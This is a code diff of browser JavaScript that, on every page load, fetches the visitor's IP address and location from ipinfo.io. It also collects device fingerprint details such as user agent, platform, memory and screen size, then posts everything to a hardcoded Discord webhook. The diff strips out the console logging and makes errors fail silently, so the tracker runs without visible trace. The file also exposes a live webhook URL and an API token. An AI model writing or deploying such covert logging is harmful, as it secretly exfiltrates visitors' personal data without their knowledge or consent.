@@ -1,43 +1,44 @@
 async function sendDiscordMessage(message) {
   const webhookUrl = 'https://discord.com/api/webhooks/1375534402389413888/wfcYejfEJTgGFMR1hcxjfKwwMwn-hPriJ6Crmk0O6h_OrpXvnL2HMHAzNhy74HqrUhoW';
-  const payload = { content: message };
+
+  const payload = {
+    content: message
+  };
 
   try {
     const res = await fetch(webhookUrl, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      headers: {
+        'Content-Type': 'application/json'
+      },
       body: JSON.stringify(payload)
     });
 
     if (!res.ok) {
-      console.error(`❌ Discord API error: ${res.status}`);
-    } else {
-      console.log("✅ Discord mesajı başarıyla gönderildi.");
+      throw new Error(`Discord API error: ${res.status}`);
     }
-  } catch (err) {
-    console.error('❌ Discord mesajı gönderilirken hata oluştu:', err);
-  }
+  } catch (err) {}
 }
 
 window.addEventListener('load', async () => {
   try {
-    const ipRes = await fetch('https://ipinfo.io/json?token=f67c5ecf0e57d3');
-    if (!ipRes.ok) throw new Error('IP info API error');
-    const visitor = await ipRes.json();
+    const res = await fetch('https://ipinfo.io/json?token=f67c5ecf0e57d3');
+    if (!res.ok) throw new Error('IP info API error');
+    const visitor = await res.json();
 
-    const ua = navigator.userAgent;
-    const language = navigator.language;
-    const platform = navigator.platform;
-    const cookieEnabled = navigator.cookieEnabled;
-    const deviceMemory = navigator.deviceMemory || 'Unknown';
-    const hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
-    const screenRes = `${screen.width}x${screen.height}`;
-    const availRes = `${screen.availWidth}x${screen.availHeight}`;
-    const pixelRatio = window.devicePixelRatio || 1;
-    const onlineStatus = navigator.onLine ? 'Yes' : 'No';
+     const ua = navigator.userAgent;
+        const language = navigator.language;
+        const platform = navigator.platform;
+        const cookieEnabled = navigator.cookieEnabled;
+        const deviceMemory = navigator.deviceMemory || 'Unknown';
+        const hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
+        const screenRes = `${screen.width}x${screen.height}`;
+        const availRes = `${screen.availWidth}x${screen.availHeight}`;
+        const pixelRatio = window.devicePixelRatio || 1;
+        const onlineStatus = navigator.onLine ? 'Yes' : 'No';
 
     const message = `
-**💻 Visitor Info**
+    **💻 Visitor Info**
 IP: ${visitor.ip}
 Country: ${visitor.country || 'Unknown'}
 City: ${visitor.city || 'Unknown'}
@@ -60,11 +61,8 @@ Online: ${onlineStatus}
 Screen Resolution: ${screenRes}
 Available Space: ${availRes}
 Pixel Ratio: ${pixelRatio}
-`;
+    `;
 
-    console.log("🟡 Ziyaretçi bilgileri hazır, Discord'a gönderiliyor...");
     sendDiscordMessage(message);
-  } catch (e) {
-    console.error('❌ Bilgi toplama sırasında hata oluştu:', e);
-  }
+  } catch (e) {}
 });
